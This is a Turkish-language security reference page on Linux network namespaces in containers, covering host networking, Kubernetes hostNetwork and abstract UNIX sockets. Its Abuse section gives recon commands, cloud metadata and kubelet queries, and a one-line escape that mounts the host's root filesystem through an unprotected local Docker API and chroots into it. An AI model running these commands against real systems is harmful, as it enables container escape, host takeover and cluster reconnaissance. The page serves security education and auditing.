# Network Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

Network namespace; arayüzler, IP adresleri, routing tabloları, ARP/neighbor durumu, firewall kuralları, socket'ler, UNIX-domain abstract socket namespace'i ve `/proc/net` gibi dosyaların içeriği gibi ağla ilgili kaynakları izole eder. Bu nedenle bir container, host'un gerçek ağ stack'ine sahip olmadan kendi `eth0` arayüzüne, kendi yerel route'larına ve kendi loopback cihazına sahipmiş gibi görünebilir.

Güvenlik açısından bu önemlidir çünkü network isolation, port binding işleminden çok daha fazlasını kapsar. Özel bir network namespace, workload'un doğrudan gözlemleyebileceği veya yeniden yapılandırabileceği kaynakları sınırlar. Bu namespace host ile paylaşıldığında container bir anda host listener'larını, host-local servislerini, abstract AF_UNIX endpoint'lerini ve uygulamaya açılması hiç amaçlanmamış ağ kontrol noktalarını görünür şekilde kullanabilir.

## Operation

Yeni oluşturulmuş bir network namespace, kendisine arayüzler bağlanana kadar boş veya neredeyse boş bir ağ ortamıyla başlar. Container runtime'ları daha sonra virtual interface'ler oluşturur veya bunlara bağlanır, adresler atar ve workload'un beklenen bağlantıya sahip olması için route'ları yapılandırır. Bridge tabanlı deployment'larda bu genellikle container'ın host bridge'e bağlı, veth destekli bir arayüz görmesi anlamına gelir. Kubernetes'te CNI plugin'leri, Pod networking için eşdeğer kurulumu gerçekleştirir.

Bu architecture, `--network=host` veya `hostNetwork: true` seçeneklerinin neden bu kadar büyük bir değişiklik olduğunu açıklar. Workload, hazırlanmış özel bir network stack almak yerine doğrudan host'un gerçek network stack'ine katılır.

## Lab

Şuna benzer şekilde neredeyse boş bir network namespace görebilirsiniz:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Ve normal ve host-networked container'ları şu şekilde karşılaştırabilirsiniz:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Host-network kullanan container artık kendi izole socket ve interface görünümüne sahip değildir. İşlemin hangi capabilities değerlerine sahip olduğunu sormadan önce bile, bu değişiklik tek başına oldukça önemlidir.

## Runtime Kullanımı

Docker ve Podman, aksi yapılandırılmadığı sürece normalde her container için private bir network namespace oluşturur. Kubernetes genellikle her Pod'a kendi network namespace'ini verir; bu namespace Pod içindeki container'lar arasında paylaşılır, ancak host'tan ayrıdır. Bu nedenle `127.0.0.1` genellikle container-local değil, Pod-local'dır: yalnızca localhost'a bağlı bir listener'a bir container içindeki sidecar'lar ve kardeş container'lar çoğunlukla erişebilir. Incus/LXC sistemleri de zengin network namespace tabanlı isolation sağlar ve genellikle daha geniş çeşitlilikte virtual networking yapılandırmaları sunar.

Yaygın ilke, private networking'in varsayılan isolation sınırı olması, host networking'in ise bu sınırdan açıkça vazgeçmek anlamına gelmesidir.

## Yanlış Yapılandırmalar

En önemli yanlış yapılandırma, host network namespace'ini paylaşmaktır. Bu bazen performance, low-level monitoring veya kolaylık amacıyla yapılır, ancak container'lar için mevcut en net sınırlardan birini ortadan kaldırır. Host-local listener'lara daha doğrudan erişilebilir, yalnızca localhost'a bağlı servisler erişilebilir hale gelebilir ve `CAP_NET_ADMIN` veya `CAP_NET_RAW` gibi capabilities çok daha tehlikeli olur; çünkü bunların etkinleştirdiği işlemler artık host'un kendi network ortamına uygulanır.

Bir diğer sorun, network namespace private olsa bile network ile ilgili capabilities değerlerinin gereğinden fazla verilmesidir. Private namespace yardımcı olur, ancak raw socket'ları veya gelişmiş network kontrolünü zararsız hale getirmez.

Kubernetes'te `hostNetwork: true`, Pod-level network segmentation'a ne ölçüde güvenebileceğinizi de değiştirir. Kubernetes, birçok network plugin'inin `podSelector` / `namespaceSelector` eşleştirmesi için `hostNetwork` Pod trafiğini doğru şekilde ayırt edemediğini ve bu nedenle bu trafiği normal node trafiği olarak değerlendirdiğini belirtir. Bir attacker's bakış açısından bu, ele geçirilmiş bir `hostNetwork` workload'un çoğunlukla normal bir Pod olarak değil, overlay-network workload'larıyla aynı policy varsayımlarıyla kısıtlanmayan node-level bir network foothold olarak değerlendirilmesi gerektiği anlamına gelir.

## Abuse

Isolation'ın zayıf olduğu kurulumlarda attackers, host üzerindeki listening servislerini inceleyebilir, yalnızca loopback'e bağlı management endpoint'lerine erişebilir, kesin capabilities ve ortama bağlı olarak trafiği sniff edebilir veya trafiğe müdahale edebilir ya da `CAP_NET_ADMIN` mevcutsa routing ve firewall durumunu yeniden yapılandırabilir. Bir cluster içinde bu durum lateral movement ve control-plane reconnaissance işlemlerini de kolaylaştırabilir.

Host networking'den şüpheleniyorsanız, görünür interface'lerin ve listener'ların isolated bir container network'üne değil, host'a ait olduğunu doğrulayarak başlayın:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Yalnızca loopback üzerinden çalışan servisler genellikle ilk ilginç keşiftir:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstract UNIX socket'ler, TCP/UDP listener'ları gibi görünmedikleri ve `/run` altında filesystem path'leri olarak bulunmayabilecekleri için gözden kaçırılması kolay başka bir hedeftir. Bu nedenle host-networked bir container, container'a hiç bind-mount edilmemiş host-only control channel'larına erişimi devralabilir:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Tarihsel bir örnek, `containerd-shim` abstract-socket exposure bug'ıydı; ancak daha geniş ders, belirli CVE'den daha önemlidir: Bir workload host network namespace'e katıldığında, abstract AF_UNIX services de attack surface'in bir parçası haline gelir. Bu socket'ler runtime ile ilişkili veya administrative görünüyorsa [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md) bölümüne geçin.

Network capabilities mevcutsa, workload'un görünür stack'i inceleyip değiştirebildiğini test edin:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Modern kernel'lerde, host networking ile birlikte `CAP_NET_ADMIN`, basit `iptables` / `nftables` değişikliklerinin ötesinde paket yoluna da erişim sağlayabilir. `tc` qdisc'leri ve filtreleri de namespace kapsamındadır; bu nedenle paylaşılan host network namespace içinde, container'ın görebildiği host arayüzlerine uygulanırlar. Ayrıca `CAP_BPF` mevcutsa, TC ve XDP loader'ları gibi ağla ilgili eBPF programları da önem kazanır:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Bu önemlidir, çünkü bir saldırgan trafiği yalnızca firewall kurallarını yeniden yazarak değil, host interface düzeyinde de yansıtabilir, yönlendirebilir, şekillendirebilir veya düşürebilir. Private network namespace içinde bu eylemler container görünümüyle sınırlıdır; shared host namespace içinde ise host'u etkiler hâle gelir.

Cluster veya cloud ortamlarında host networking, metadata ve control-plane'e komşu servisler için hızlı bir yerel recon yapılmasını da gerekli kılar:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Kubernetes'te, multi-container bir Pod'daki **herhangi** bir container'ın ele geçirilmesinin, sibling container'lar ve sidecar'lar tarafından açılan localhost listener'larına da erişim sağladığını unutmayın; çünkü Pod'un tamamı tek bir network namespace paylaşır. Bu durum, admin veya debug arayüzleri cluster genelinde değil, kasıtlı olarak yalnızca Pod içinde erişilebilir olacak şekilde yapılandırılan service-mesh, observability ve helper container'ları için özellikle önemlidir:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
"bound to localhost" ifadesini **Pod-private**, **container-private** olarak değerlendirin. Pod içindeki container'lardan biri compromise edildikten sonra bu varsayım geçerliliğini yitirir.

### Tam Örnek: Host Networking + Local Runtime / Kubelet Erişimi

Host networking otomatik olarak host root yetkisi sağlamaz, ancak genellikle yalnızca node'un kendisinden erişilmesi amaçlanan servisleri açığa çıkarır. Bu servislerden biri zayıf şekilde korunuyorsa host networking doğrudan bir privilege-escalation yolu haline gelir.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost üzerindeki Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Etki:

- uygun koruma olmadan yerel bir runtime API açığa çıkarsa doğrudan host ele geçirilmesi
- kubelet veya yerel agent'lara erişilebiliyorsa cluster keşfi veya lateral movement
- `CAP_NET_ADMIN` ile birleştirildiğinde trafik manipülasyonu veya hizmet reddi

## Kontroller

Bu kontrollerin amacı, sürecin özel bir network stack'e sahip olup olmadığını, hangi route'ların ve listener'ların görünür olduğunu ve capability'leri test etmeden önce network görünümünün zaten host benzeri olup olmadığını öğrenmektir.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Burada ilginç olanlar:

- `/proc/self/ns/net` ve `/proc/1/ns/net` zaten host benzeri görünüyorsa container, host network namespace'ini veya başka bir private olmayan namespace'i paylaşıyor olabilir.
- Shell zaten adlandırılmış veya persistent bir namespace'in içindeyse ve bunu host tarafındaki `/run/netns` nesneleriyle ilişkilendirmek istiyorsanız, `lsns -t net` ve `ip netns identify` kullanışlıdır.
- `ss -lntup` özellikle değerlidir; çünkü yalnızca loopback üzerinde dinleyen listener'ları ve yerel management endpoint'lerini ortaya çıkarır. `ss -xap` ve `/proc/net/unix`, normal filesystem socket aramalarının kaçırdığı abstract-socket görünümünü sağlar.
- `CAP_NET_ADMIN`, `CAP_NET_RAW` veya `CAP_BPF` mevcutsa route'lar, interface adları, firewall context'i, `tc` state'i ve eBPF attachment'ları çok daha önemli hale gelir.
- Kubernetes'te `hostNetwork` kullanan bir Pod'da service-name resolution başarısız oluyorsa bu, service'in mevcut olmadığı anlamına gelmeyebilir; Pod yalnızca `dnsPolicy: ClusterFirstWithHostNet` kullanmıyor olabilir.
- Multi-container Pod'larda localhost listener'ları tüm Pod network namespace'ine aittir. Bu nedenle loopback-only bir portun compromised container'dan erişilemez olduğunu varsaymadan önce sidecar'ları ve sibling container'ları kontrol edin.

Bir container'ı incelerken network namespace'ini her zaman capability set'iyle birlikte değerlendirin. Host networking ve güçlü network capabilities, bridge networking ve dar bir default capability set'inden çok farklı bir security posture oluşturur.

## Referanslar

- [Kubernetes NetworkPolicy ve `hostNetwork` ile ilgili önemli noktalar](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux `network_namespaces(7)` ve abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd advisory: host-network container'larına açılan abstract Unix domain socket'leri](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [Network-related eBPF program'ları için eBPF token ve capability gereksinimleri](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
